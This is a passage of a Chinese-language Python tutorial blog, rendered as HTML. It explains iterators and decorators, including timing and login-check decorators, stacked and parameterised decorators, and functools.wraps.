class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>:<span class="number">2</span>,<span class="string">&#x27;c&#x27;</span>:<span class="number">3</span>&#125;</span><br><span class="line"><span class="comment"># 转换为迭代器对象</span></span><br><span class="line">dic_iter = dic.__iter__()</span><br><span class="line"><span class="comment"># 发现迭代器对象也可以进行__iter__转换</span></span><br><span class="line">dic_iter.__iter__()</span><br><span class="line"><span class="comment"># 发现dic_iter和dic_iter.__iter__()的内存地址都没有变化,是否调用一个样</span></span><br><span class="line"><span class="comment"># 3144960901824 3144960901824</span></span><br><span class="line">print(id(dic_iter),id(dic_iter.__iter__()))</span><br></pre></td></tr></table></figure><p>问题来了,迭代器对象的<code>__iter__</code>有什么用？</p><p>本文可迭代对象部分提到过，可迭代对象：字符串、列表、元组、字典、集合和文件对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.__iter__()</span><br><span class="line">    f.__next__()</span><br></pre></td></tr></table></figure><p>但是文件对象不只是可迭代对象，他也是迭代器对象，它可以直接调用<code>__next__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.__next__())</span><br><span class="line">    print(f.__next__())</span><br></pre></td></tr></table></figure><p><img src="https://skystarry-1251157247.cos.ap-chengdu.myqcloud.com/img/image-20201225170845690.png" alt="image-20201225170845690"></p><p>而for循环的工作原理是<code>1. dic.__iter__()得到迭代器对象</code>，而for循环并不知道他是文件对象，也就是说，我们按照for循环的规则进行转写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f_iter = f.__iter__() <span class="comment"># 迭代器对象被.__iter__()转成了迭代器对象</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(f_iter.__next__())</span><br><span class="line">        <span class="keyword">except</span> StopIteration:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>前文提到过<code>迭代器对象被.__iter__()转成了迭代器对象</code>是不会有任何变化的，但是如果他没有这个功能，在文件对象中就会导致for循环因为不能转变为迭代器对象而导致语法错误</p><hr><h1 id="迭代器的优缺点"><a href="#迭代器的优缺点" class="headerlink" title="迭代器的优缺点"></a>迭代器的优缺点</h1><p>基于索引的迭代取值，所有迭代的状态都保存在了索引中，而基于迭代器实现迭代的方式不再需要索引，所有迭代的状态就保存在迭代器中，然而这种处理方式优点与缺点并存：</p><h2 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h2><p>1、为序列和非序列类型提供了一种统一的迭代取值方式。</p><p>2、惰性计算：迭代器对象表示的是一个<strong>数据流</strong>，并非是一次性全部加载到内存，它可以只在需要时才去调用<strong>next</strong>来计算出一个值，就迭代器本身来说，同一时刻在内存中只有一个值，因而可以存放无限大的数据流，例如一个超级大的文件，python直接把文件对象做成了迭代器对象，在内存中一次性只加载next的那一部分。而对于其他容器类型，如列表，需要把所有的元素都存放于内存中，受内存大小的限制，可以存放的值的个数是有限的。</p><h2 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h2><p>1、除非取尽，否则无法获取迭代器的长度</p><p>2、只能取下一个值，不能回到开始，更像是‘一次性的’，迭代器产生后的唯一目标就是重复执行next方法直到值取尽，否则就会停留在某个位置，等待下一次调用next；若是要再次迭代同个对象，你只能重新调用iter方法去创建一个新的迭代器对象，如果有两个或者多个循环使用同一个迭代器，必然只会有一个循环能取到值。</p>]]></content>
      
      
      <categories>
          
          <category> 程序语言 </category>
          
          <category> Python </category>
          
          <category> python基础 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>20.python装饰器</title>
      <link href="%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/20.python%E8%A3%85%E9%A5%B0%E5%99%A8/"/>
      <url>%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Python/python%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/20.python%E8%A3%85%E9%A5%B0%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<p>‘器’指的是工具/器具</p><p>‘装饰’指的是为其他事物添加额外的东西点缀</p><p>装饰器指的是定义一个函数(或者类)，该函数是用来装饰其他函数的(为其他函数添加额外的功能)，准确的说<strong>装饰器的作用就是在不修改被装饰对象源代码和调用方式的前提下为被装饰对象添加额外的功能</strong></p><a id="more"></a><hr><h1 id="开放封闭原则"><a href="#开放封闭原则" class="headerlink" title="开放封闭原则"></a>开放封闭原则</h1><p>软件的设计应该遵循开放封闭原则</p><p><strong>开放：对拓展功能是开放的</strong></p><p><strong>封闭：对修改源代码是封闭的</strong></p><p>对拓展功能开放，意味着有新的需求或变化时，可以对现有代码进行扩展，以适应新的情况。对修改封闭，意味着函数/对象一旦设计完成，就可以独立完成其工作，而不要对其进行修改。</p><p>软件包含的所有功能的源代码以及调用方式，都应该避免修改，否则一旦改错，则极有可能产生连锁反应，最终导致程序崩溃，而对于上线后的软件，新需求或者变化又层出不穷，我们必须为程序提供扩展的可能性，这就用到了装饰器。</p><hr><h1 id="装饰器的实现"><a href="#装饰器的实现" class="headerlink" title="装饰器的实现"></a>装饰器的实现</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">name,age</span>):</span></span><br><span class="line">    time.sleep(<span class="number">3</span>) <span class="comment"># 暂停3秒</span></span><br><span class="line">    print(<span class="string">&#x27;name:%s,age:%s&#x27;</span> %(name,age))</span><br><span class="line">index(<span class="string">&#x27;kinght&#x27;</span>,<span class="string">&#x27;20&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>需求：在不修改index函数源代码以及调用方式的情况下为其添加统计运行时间的功能</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">x,y,z</span>):</span> <span class="comment"># index函数源代码没有改变</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">&#x27;index x=%s y=%s z=%s&#x27;</span>%(x,y,z))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;index&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>(<span class="params">name</span>):</span></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    print(<span class="string">&#x27;welcome %s to home page&#x27;</span>%name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timmer</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;计算运行时长的装饰器&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args,**kwargs</span>):</span> <span class="comment"># 可以接受任意参数</span></span><br><span class="line">        start = time.time()  <span class="comment"># time.time 从uninx元年(1970年1月1日)到现在的秒</span></span><br><span class="line">        res = func(*args,**kwargs) <span class="comment"># 传递函数的参数,并接受返回值</span></span><br><span class="line">        stop = time.time()</span><br><span class="line">        print(stop - start)</span><br><span class="line">        <span class="keyword">return</span> res <span class="comment"># 返回被装饰函数的返回值</span></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line">index = timmer(index) <span class="comment"># timmer(待测量运行时长的函数名)</span></span><br><span class="line">res = index(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) <span class="comment"># 使用者调用方式没有改变,但增加了程序运行计算时长的功能</span></span><br><span class="line">print(res)</span><br><span class="line">print(index.__name__) <span class="comment"># 返回真实的函数名</span></span><br><span class="line">home = timmer(home) <span class="comment"># 也可以装饰其他对象</span></span><br><span class="line">home(<span class="string">&#x27;kinght&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="偷梁换柱的要求"><a href="#偷梁换柱的要求" class="headerlink" title="偷梁换柱的要求"></a>偷梁换柱的要求</h2><p>index的参数什么样子，wrapper的参数就应该什么样子</p><p>index的返回值什么样子，wrapper的返回值就应该什么样子</p><p>index的属性什么样子，wrapper的属性就应该什么样子（下文伪装装饰器实现）</p><hr><h1 id="语法糖"><a href="#语法糖" class="headerlink" title="语法糖"></a>语法糖</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timmer</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;计算运行时长的装饰器&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args,**kwargs</span>):</span> <span class="comment"># 可以接受任意参数</span></span><br><span class="line">        start = time.time()  <span class="comment"># time.time 从uninx元年(1970年1月1日)到现在的秒</span></span><br><span class="line">        res = func(*args,**kwargs) <span class="comment"># 传递函数的参数,并接受返回值</span></span><br><span class="line">        stop = time.time()</span><br><span class="line">        print(stop - start)</span><br><span class="line">        <span class="keyword">return</span> res <span class="comment"># 返回被装饰函数的返回值</span></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在被装饰对象的正上方单独一行写@装饰器名字，就可以省略index = timmer(index)</span></span><br><span class="line"><span class="meta">@timmer # 函数必须放于装饰器下方</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">x,y,z</span>):</span> <span class="comment"># index函数源代码没有改变</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">&#x27;index x=%s y=%s z=%s&#x27;</span>%(x,y,z))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;index&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># index = timmer(index)</span></span><br><span class="line">index(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h2 id="叠加多个装饰器"><a href="#叠加多个装饰器" class="headerlink" title="叠加多个装饰器"></a>叠加多个装饰器</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 为了区分进行标识</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deco1</span>(<span class="params">func1</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper1</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">        print(<span class="string">&quot;deco1.wrapper1.func1运行前&quot;</span>)</span><br><span class="line">        res1 = func1(*args,**kwargs)</span><br><span class="line">        print(<span class="string">&quot;deco1.wrapper1.func1运行后&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> res1</span><br><span class="line">    <span class="keyword">return</span> wrapper1</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deco2</span>(<span class="params">func2</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper2</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">        print(<span class="string">&quot;deco2.wrapper2.func2运行前&quot;</span>)</span><br><span class="line">        res2 = func2(*args,**kwargs)</span><br><span class="line">        print(<span class="string">&quot;deco2.wrapper2.func2运行后&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> res2</span><br><span class="line">    <span class="keyword">return</span> wrapper2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deco3</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">outter3</span>(<span class="params">func3</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper3</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">            print(<span class="string">&quot;outter3.wrapper3.func3运行前&quot;</span>)</span><br><span class="line">            res3 = func3(*args,**kwargs)</span><br><span class="line">            print(<span class="string">&quot;outter3.wrapper3.func3运行后&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> res3</span><br><span class="line">        <span class="keyword">return</span> wrapper3</span><br><span class="line">    <span class="keyword">return</span> outter3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载顺序自下而上</span></span><br><span class="line"><span class="meta">@deco1 # --&gt; index=deco1(wrapper2的内存地址) ==&gt; index = wrapper1的内存地址</span></span><br><span class="line"><span class="meta">@deco2 # --&gt; index=deco2(wrapper3的内存地址) ==&gt; index = wrapper2的内存地址</span></span><br><span class="line"><span class="meta">@deco3(111) #  --&gt; index=outter3(被装饰对象index的内存地址) ==&gt; index = wrapper3的内存地址</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;from index %s:%s&#x27;</span> %(x,y))</span><br><span class="line">print(index) <span class="comment"># 内存地址是wrapper1  &lt;function deco1.&lt;locals&gt;.wrapper1 at 0x0000016EC009ADC0&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行顺序至上而下</span></span><br><span class="line"><span class="comment"># 首先运行deco1，但是执行到func1调用的时候，由于加载，所以知道有deco1调用的是deco2的return，所以会跳转到deco2</span></span><br><span class="line"><span class="comment"># 运行deco2的func2调用，由于加载，所以知道有deco2调用的是deco3的return，所以会跳转到deco3,然后deco3的func来自于index，有调用index</span></span><br><span class="line">index(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">运行结果：</span></span><br><span class="line"><span class="string">&lt;function deco1.&lt;locals&gt;.wrapper1 at 0x000001DF92FC1160&gt;</span></span><br><span class="line"><span class="string">deco1.wrapper1.func1运行前</span></span><br><span class="line"><span class="string">deco2.wrapper2.func2运行前</span></span><br><span class="line"><span class="string">outter3.wrapper3.func3运行前</span></span><br><span class="line"><span class="string">from index 1:2</span></span><br><span class="line"><span class="string">outter3.wrapper3.func3运行后</span></span><br><span class="line"><span class="string">deco2.wrapper2.func2运行后</span></span><br><span class="line"><span class="string">deco1.wrapper1.func1运行后</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="到底做了什么？"><a href="#到底做了什么？" class="headerlink" title="@到底做了什么？"></a>@到底做了什么？</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@print</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 程序结果输出 &lt;function func at 0x000001CFFE95F040&gt;</span></span><br><span class="line"><span class="comment"># 已知 @函数名 == （被装饰函数名 = 函数名(被装饰函数名)）</span></span><br><span class="line">func = print(func)</span><br><span class="line"></span><br><span class="line"><span class="meta">@print(123) # 名字加括号的优先级是最高的</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 函数报错：TypeError: &#x27;NoneType&#x27; object is not callable</span></span><br><span class="line"><span class="comment"># @print(123) == (print(123)的返回值被@调用)</span></span><br><span class="line"><span class="comment"># print函数没有返回值，所以为None</span></span><br><span class="line"><span class="comment"># @print == @None</span></span><br></pre></td></tr></table></figure><hr><h1 id="无参装饰器模板"><a href="#无参装饰器模板" class="headerlink" title="无参装饰器模板"></a>无参装饰器模板</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 总结：无参装饰器的基本模板</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outter</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">        <span class="comment"># 1.调用原函数</span></span><br><span class="line">        <span class="comment"># 2.为其增加新功能</span></span><br><span class="line">        res = func(*args,**kwargs)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"><span class="meta">@outter</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;from index&#x27;</span>)</span><br><span class="line">index()</span><br></pre></td></tr></table></figure><hr><h1 id="装饰器伪装及被装饰对象文档同步"><a href="#装饰器伪装及被装饰对象文档同步" class="headerlink" title="装饰器伪装及被装饰对象文档同步"></a>装饰器伪装及被装饰对象文档同步</h1><h2 id="name-伪装"><a href="#name-伪装" class="headerlink" title="__name__伪装"></a><code>__name__</code>伪装</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看真实函数信息</span></span><br><span class="line">函数.__name__</span><br><span class="line"><span class="comment"># 装饰器伪装</span></span><br><span class="line">函数wrapper.__name__ = <span class="string">&#x27;原函数名.__name__&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="被装饰对象文档同步"><a href="#被装饰对象文档同步" class="headerlink" title="被装饰对象文档同步"></a>被装饰对象文档同步</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看文档</span></span><br><span class="line">print(help(函数名))</span><br><span class="line">print(函数名.__doc__)</span><br><span class="line"><span class="comment"># 被装饰后由于指向的是装饰器闭包函数，所以查看的是闭包函数文档，而原来的函数文档并不能被查看</span></span><br><span class="line"><span class="comment"># 需要在装饰器中同步</span></span><br><span class="line">函数wrapper.__doc__ = <span class="string">&#x27;原函数.__doc__&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="基本手动伪装修饰器思路"><a href="#基本手动伪装修饰器思路" class="headerlink" title="基本手动伪装修饰器思路"></a>基本手动伪装修饰器思路</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 总结：无参装饰器的基本模板</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outter</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">        <span class="comment"># 1.调用原函数</span></span><br><span class="line">        res = func(*args,**kwargs)</span><br><span class="line">        <span class="comment"># 2.为其增加新功能</span></span><br><span class="line">        <span class="comment"># 3.伪装代码</span></span><br><span class="line">        wrapper.__name__ = func.__name__</span><br><span class="line">        wrapper.__doc__ = func.__doc__</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"><span class="meta">@outter</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;from index&#x27;</span>)</span><br><span class="line">index()</span><br></pre></td></tr></table></figure><h2 id="自动伪装修饰器"><a href="#自动伪装修饰器" class="headerlink" title="自动伪装修饰器"></a>自动伪装修饰器</h2><p>由于<code>__xx__</code>太多了，手动写很容易遗漏，python中有一个包可以快速完成这一步</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outter</span>(<span class="params">func</span>):</span></span><br><span class="line"><span class="meta">    @wraps(func) # wrapper.__xx__ = func.__xx__</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">        res = func(*args,**kwargs)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"><span class="meta">@outter</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;这是index文档&#x27;&#x27;&#x27;</span></span><br><span class="line">    print(<span class="string">&#x27;from index&#x27;</span>)</span><br><span class="line">print(index.__name__) <span class="comment"># index</span></span><br><span class="line">print(index.__doc__) <span class="comment"># 这是index文档</span></span><br></pre></td></tr></table></figure><hr><h1 id="有参装饰器"><a href="#有参装饰器" class="headerlink" title="有参装饰器"></a>有参装饰器</h1><p>无参装饰器的形成是因为要满足偷梁换柱的要求，所以要让wrapper和被装饰对象保持一致，所以在外面套了一层，而有参装饰器又是在无参函数的外面套了一层，这次是因为语法糖不支持</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 错误演示</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outter</span>(<span class="params">func,x</span>):</span> <span class="comment"># 假设需要传入两个值语法糖就会报错了</span></span><br><span class="line">    <span class="comment"># func = 函数内存地址</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">        res = func(*args,**kwargs)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">return</span> wrapper()</span><br><span class="line"><span class="meta">@outter # outter(index) 需要两个参数，但语法糖只传入了一个参数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    print(x,y)</span><br></pre></td></tr></table></figure><p>如果说遇到wrapper内还需要参数，我们就只能再往外套一层</p><h2 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h2><p>这是对index函数写登陆验证的装饰器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args,**kwargs</span>):</span></span><br><span class="line">        name = input(<span class="string">&quot;your name&gt;&gt;&gt;:&quot;</span>).strip()</span><br><span class="line">        passwd = input(<span class="string">&quot;your passwd&gt;&gt;&gt;:&quot;</span>)</span><br><span class="line">        <span class="comment"># 基于文本文件user的验证方式</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">&#x27;user&#x27;</span>,mode=<span class="string">&#x27;rt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> userfile:</span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> userfile:</span><br><span class="line">                username,password = user.strip().split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> name == username <span class="keyword">and</span> passwd == password:</span><br><span class="line">                    res = func(*args,**kwargs)</span><br><span class="line">                    <span class="keyword">return</span> res</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">&#x27;your username or password error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"><span class="meta">@auth</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>(<span class="params">x,y</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;index -&gt; %s:%s&#x27;</span> %(x,y))</span><br><span class="line">index(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>但是现在有个问题，目前的验证装饰器只能适用于文本文件user，而假如需要使用到其他的函数中，其他函数需要使用例如数据库例如LDAP进行验证，这个装饰器的功能就被局限住了</p><p>由于还没有学到数据库和LDAP，为了让代码更加直观，所以将从文件中去数据的方式进行文字描述，不写具体代码了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 